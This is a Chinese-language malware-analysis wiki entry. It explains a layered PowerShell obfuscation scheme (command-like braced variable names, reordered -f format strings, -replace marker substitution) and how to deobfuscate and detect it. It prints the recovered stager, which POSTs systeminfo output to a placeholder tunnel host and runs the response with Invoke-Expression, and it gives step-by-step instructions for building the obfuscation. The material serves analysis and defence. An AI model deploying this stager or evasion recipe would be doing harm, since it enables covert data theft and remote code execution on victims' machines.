---
id: code-analysis-reverse-obfuscation-powershell-braced-variable-format-reorder
title: PowerShell 花括号变量名伪装 + -f 占位重排 + 字符码替换的三层混淆与去混淆
type: scenario
domain: code-analysis
path: code-analysis/reverse/obfuscation
technique: powershell-braced-variable-name-format-reorder-obfuscation
tags:
- powershell
- obfuscation
- deobfuscation
- malware-analysis
- defense-evasion
- windows
- c2
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V184
  verified_at: '2026-11-06T20:04:48+08:00'
  notes: 已对照原文与全部20张图片核对：花括号变量名、-f占位重排、uJ3/IMr/E9F/gGl/ULv替换映射、去混淆顺序与原文一致；未执行原样本，-f示例按PowerShell语义推导。
url: /docs/code-analysis/reverse/obfuscation/code-analysis-reverse-obfuscation-powershell-braced-variable-format-reorder/
draft: false
kb_aliases:
- PowerShell 花括号变量名混淆
- ${命令样式} 变量赋值
- -f 格式化占位重排
- '[CHaR] 字符码替换去混淆'
- PowerShell 多层字符串拼接混淆
- Invoke-RestMethod 混淆 stager
---

## 一句话结论

恶意 PowerShell 用 `${Write-Error -ArgumentList ... && ($gnci)}` 这类“看起来像命令”的花括号变量名承载 Base64 数据，再用 `-f` 格式化运算符把乱序占位符拼回字符串，最后用 `-replace` 把 `uJ3/IMr/E9F/gGl/ULv` 等标记替换成反引号、`$`、双引号、`|`、单引号，运行时才还原出 `Invoke-RestMethod` 与 `Invoke-Expression`；人工去混淆时按“变量替换 → Base64 解码 → 标记替换 → `-f` 求值”顺序即可还原。

## 原理

- **变量名伪装**：PowerShell 允许用 `${...}` 包裹任意字符作为变量名，包括空格、运算符和命令样式文本。`${Write-Error -ArgumentList -DestinationPath %TEMP% && ($gnci)} = "KCgn..."` 实际只是一次变量赋值，不是执行 `Write-Error`；静态规则若只匹配命令关键字，或在日志里快速扫读，容易把它误判为合法命令调用。
- **碎片化拼接**：待执行的 Base64 或脚本被拆成大量以 `+` 连接的字符串片段，并配合 `-f` 格式化运算符重排：格式串像 `"{15}{16}{10}{17}..."` 这样把参数索引打乱，片段和占位符的对应关系只有运行时才成立，直接阅读几乎不可还原。
- **标记替换**：脚本尾部用 `-replace` 把无害标记映射为关键字符：`uJ3`→反引号（96）、`IMr`→`$`（36）、`E9F`→`"`（34）、`gGl`→`|`（124）、`ULv`→`'`（39）。替换后可写出 `${u`Rl}` 这类带转义反引号的变量名，也可把 `Invoke-`、`RestMethod` 等敏感词拆开，避开以明文关键词为特征的检测。
- **运行时组装**：所有片段最终拼成 `Invoke-RestMethod` 与 `Invoke-Expression`，前者 POST 受害机信息，后者执行服务器响应。全链没有明文 `IEX`、`Invoke-WebRequest` 或完整 URL，落盘内容也只是混淆脚本。
- **为什么能误导分析**：变量名本身带命令语义，且赋值右侧是看似随机的 Base64/字符串常量；如果分析人员按“命令执行”方向追，会浪费在 `Write-Error`、`ConvertTo-Json` 等伪命令上。真正的数据流是“赋值 → 拼接 → 替换 → 动态调用”，必须做变量替换才能看到。

## 触发条件

- 攻击者已能在 Windows 主机执行 PowerShell（下载器、计划任务、Web RCE 等）。
- PowerShell 版本支持 `${...}` 变量名、`-f` 格式化运算符和 `-replace`（Windows PowerShell 2.0+ 均支持）。
- 目标未启用完整的 Script Block Logging（4104）分析，或检测规则只做简单字符串匹配。

## 利用步骤

1. 把要执行的脚本（如 `Invoke-RestMethod ... | Invoke-Expression`）做 Base64，再拆成多个片段并用 `+` 和 `-f` 乱序拼接。
2. 为片段声明多个变量，变量名使用 `${...}` 包裹命令样式文本（如 `${Write-Error -ArgumentList -DestinationPath %TEMP% && ($gnci)}`），值设为 Base64 片段或拼接表达式。
3. 在脚本尾部追加 `-replace` 链，把标记字符映射为反引号、`$`、引号、管道符等；再用 `&('ieX')`、`&("{3}{1}{0}{2}"-f ...)` 等动态调用执行还原后的命令。
4. 运行时 PowerShell 先完成变量赋值与字符串拼接，再替换标记、格式化，最后执行还原出的下载/回连逻辑。
5. 变体可再套一层 Base64 或整数数组编码，增加分析层数。

## PoC

去混淆顺序（以原文二阶段脚本为例，片段为示意）：

```powershell
# 第 1 层：把 ${...} 变量按赋值做文本替换，所有 + 与 -f 折叠后得到一个 Base64 串
$blob = '<拼接后的 Base64>'
$layer2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($blob))

# 第 2 层：按脚本尾部 -replace 的映射替换标记
$clean = $layer2.Replace('uJ3','`').Replace('IMr','$').Replace('E9F','"').Replace('gGl','|').Replace('ULv',"'")

# 第 3 层：对 -f 表达式求值（示例）
"{3}{1}{0}{2}" -f 'ssi','Expre','on','Invoke-'   # -> Invoke-Expression
"{2}{0}{1}"   -f 'emin','fo','syst'             # -> systeminfo
"{1}{3}{0}{2}" -f 'i','out-st','ng','r'         # -> out-string
```

还原后的核心逻辑：

```powershell
${u`Rl} = '<tunnel host>/<path>'
${Bo`DY} = systeminfo | Out-String
${CON`TEn`T`TyPe} = 'application/octet-stream'
${I`RES} = Invoke-RestMethod ${u`Rl} -Method POST -Body ${Bo`DY} -ContentType ${CON`TEn`T`TyPe}
Invoke-Expression ${i`R`es}
```

本库未执行原样本；`-f` 示例按 PowerShell 格式化语义推导。

## 变体与关联

- 变体：标记字符可换成任意随机串，反引号也可省略，直接靠字符串拆分绕过关键词；`-f` 可换成 `-join`、`[string]::Concat`、数组索引或 `$PSHOME[n]` 取字符拼接。
- 变体：变量名可伪装成日志、配置、路径等正常运维字段，或整句命令；赋值内容可用整数数组、十六进制、XOR 后再解码。
- 变体：动态调用可换成 `&('ieX')`、`[ScriptBlock]::Create()`、`Get-Command`/`Invoke-Expression` 反射，或 `powershell -EncodedCommand` 再套一层。
- 关联：[[code-analysis-reverse-obfuscation-powershell-integer-array-scriptblock]]（整数数组 + ScriptBlock 内存执行）、[[code-analysis-reverse-obfuscation-vbe-powershell-dotnet-layered-sample]]（VBE 与 PowerShell 多层样本）、[[pentest-c2-signed-downloader-trycloudflare-quick-tunnel-stager]]（本混淆脚本所属的隧道投递链）。

## 检测与防御

- **日志检测**：4104 脚本块日志中出现 `${` 开头且变量名含空格、`-`、`&&`、`Write-Error`、`ConvertTo-Json` 等命令样式文本的赋值；同一脚本出现大量 `+` 字符串拼接、`-f` 高位乱序占位符、`-replace` 链和 `[CHaR]` 数字拼接。
- **行为检测**：还原后常见 `Invoke-RestMethod`/`Invoke-WebRequest` 与 `Invoke-Expression`/`&('ieX')` 组合，`systeminfo | Out-String` 作为 POST body，`Content-Type: application/octet-stream`。
- **分析建议**：不要直接执行样本；在隔离环境用 PowerShell AST 解析或文本替换还原 `${...}` 变量，先解码 Base64 再按 `-replace` 映射还原，最后才求值 `-f`。对每层结果保留原始片段以便回溯。
- **防御**：启用 Script Block Logging、Module Logging、Transcription 与 AMSI，集中采集 4104/4103 并做解码后内容检测；启用 Constrained Language Mode 和应用控制，限制普通用户目录下的 PowerShell 执行；对可疑脚本做静态 AST 特征匹配而非仅关键词匹配。
